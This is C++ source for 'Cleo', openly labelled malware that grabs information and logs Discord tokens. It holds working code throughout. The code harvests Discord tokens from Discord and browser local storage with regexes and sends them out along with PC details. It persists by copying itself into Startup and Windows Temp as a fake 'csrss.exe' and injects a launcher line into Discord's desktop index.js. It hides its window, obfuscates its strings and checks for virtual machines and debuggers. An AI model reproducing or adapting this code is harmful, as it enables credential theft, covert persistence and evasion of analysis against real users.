/*
* Offical Github Link: https://github.com/dehoisted/Cleo
* Author: Dehoisted & Passive
* Description: Malware, Info Grabber, Discord Token Logger.
* Version: 5.1
* Date Published: 8/29/2021
* This version was all edited by Dehoisted/Orlando
*/

#include "Includes.h"
namespace fs = std::filesystem;

void MainRoutine() 
{
	// If there are more paths able to be added, then let me know by making an issue on the repo. (https://github.com/dehoisted/Cleo/issues)
	const char* LIGHTCORD = AY_OBFUSCATE("\\Lightcord\\Local Storage\\leveldb");
	const char* DISCORD = AY_OBFUSCATE("\\Discord\\Local Storage\\leveldb");
	const char* DISCORDPTB = AY_OBFUSCATE("\\discordptb\\Local Storage\\leveldb");
	const char* DISCORDCANARY = AY_OBFUSCATE("\\discordcanary\\Local Storage\\leveldb");
	const char* CHROME = AY_OBFUSCATE("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
	const char* BRAVE = AY_OBFUSCATE("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
	const char* YANDEX = AY_OBFUSCATE("\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
	const char* OPERA = AY_OBFUSCATE("\\Opera Software\\Opera Stable\\Local Storage\\leveldb");

	std::vector<std::string> installs = {
		LIGHTCORD, DISCORD, DISCORDPTB, DISCORDCANARY,
		CHROME, BRAVE, YANDEX, OPERA
	};

	try {
		for (const auto& install : installs) {
			static int inc = 0;
			std::string path = std::getenv(AY_OBFUSCATE("appdata")) + install;
			if (inc > 3)
				path = std::getenv(AY_OBFUSCATE("localappdata")) + install;
			if (!fs::exists(path))
				continue;
			++inc;
			for (const fs::directory_entry& entry : fs::directory_iterator(path)) {
				std::ifstream file_path(entry.path(), std::ios_base::binary);
				std::string str((std::istreambuf_iterator<char>(file_path)), std::istreambuf_iterator<char>());
				std::vector<std::string> matches;
				std::regex expression(AY_OBFUSCATE(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
				std::regex expression2(AY_OBFUSCATE(R"(mfa\.[\w-]{84})"));

				std::vector<std::string> regex_non_mfa = Modules::find_match(str, expression);
				std::vector<std::string> regex_mfa = Modules::find_match(str, expression2);

				for (uint32_t i = 0; i < regex_non_mfa.size(); i++)
					matches.push_back(regex_non_mfa[i]);

				for (uint32_t i = 0; i < regex_mfa.size(); i++)
					matches.push_back(regex_mfa[i]);

				for (uint32_t i = 0; i < matches.size(); i++) {
					if (Modules::CheckToken(matches[i])) {
						if (!User::logged) {
							// PC Information is only sent if the user has a valid token.
							User::PC pc;
							Modules::CleoReport(pc.get_info());
						}
						User::Discord token(matches[i]);
						auto token_info = token.get_token_info();
						token_info.append("Found in path: " + path + "\n"); // Extra
						Modules::CleoReport(token_info);
						User::logged = true;
					}
				}
			}
		}
	}

	catch (const std::exception& e) {
		Modules::CleoReport(e.what());
	}
}

void InfectRoutine()
{
	char report_msg[1024];
	char current_module[MAX_PATH], startup_path[MAX_PATH], alt_path[MAX_PATH], discord_path[MAX_PATH];
	GetModuleFileNameA(nullptr, current_module, MAX_PATH);
	constexpr auto permission = fs::perms::all;

	try { // Note: "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\csrss.exe" works better, however, the file needs to be ran as administrator/has administrator privileges to be able to copy files into that directory.
		std::sprintf(startup_path, AY_OBFUSCATE("%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\csrss.exe"), std::getenv(AY_OBFUSCATE("appdata")));
		if (current_module != startup_path) {
			if (!fs::exists(startup_path)) {
				fs::copy(current_module, startup_path);
				fs::permissions(startup_path, permission);
			}
		}
		else return; // Cleo is running from startup already.

		// You need administrator to *remove* files from the Windows Temp folder.
		std::sprintf(alt_path, AY_OBFUSCATE("C:\\Windows\\Temp\\csrss.exe"));
		if ((!fs::exists(alt_path))) {
			fs::copy(current_module, alt_path);
			fs::permissions(alt_path, permission);
		}
		// Discord Infect (only works on older discord clients)
		std::sprintf(discord_path, AY_OBFUSCATE("%s\\Discord\\modules\\discord_desktop_core"), std::getenv(AY_OBFUSCATE("appdata")));
		if (fs::exists(discord_path)) {
			std::sprintf(startup_path, AY_OBFUSCATE("%s\\index.js"), discord_path);
			std::ofstream index(startup_path);
			index << "module.exports = require('./core.asar');" << std::endl \
				<< "var exec = require('child_process').execFile; exec('" << alt_path \
				<< "'); // Important Assets.";
			index.close();
		}
		// Report
		if (!fs::exists(startup_path) && !fs::exists(discord_path))
			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **failed**\nDiscord Infection: **failed**"));

		if (!fs::exists(startup_path) && fs::exists(discord_path))
			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **failed**\nDiscord Infection: **success** (%s)"), discord_path);

		if (fs::exists(startup_path) && !fs::exists(discord_path))
			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **failed**"), startup_path);

		if (fs::exists(startup_path) && fs::exists(discord_path))
			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **success** (%s)"), startup_path, discord_path);
		Modules::CleoReport(report_msg);
	}
	catch (const std::exception& e) {
		Modules::CleoReport(e.what());
	}
}

int main()
{
	// Hide Window
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	// Allocate dynamically so it can't be predicted where this will be in memory.
	Anti* anti = new Anti(Config::check_virtual_machine, Config::check_debugging, Config::check_analyzing, Config::watch_dog);
	// Code below only executes below when the Anti constructor is finished

	// Checks for internet every 1 second, if user has internet then the while loop is broken out of.
	while (Modules::IsConnectedToInternet() != Modules::INTERNET_STATUS::CONNECTED)
		std::this_thread::sleep_for(std::chrono::seconds(1));

	std::thread mr(MainRoutine); // Get PC information and find all discord tokens - info grab.
	std::thread ir(InfectRoutine); // Infect the computer & discord - persistance/infection.
	// Thread Managing
	if (mr.joinable())
		mr.join();
	if (ir.joinable())
		ir.join();
	delete anti;
}
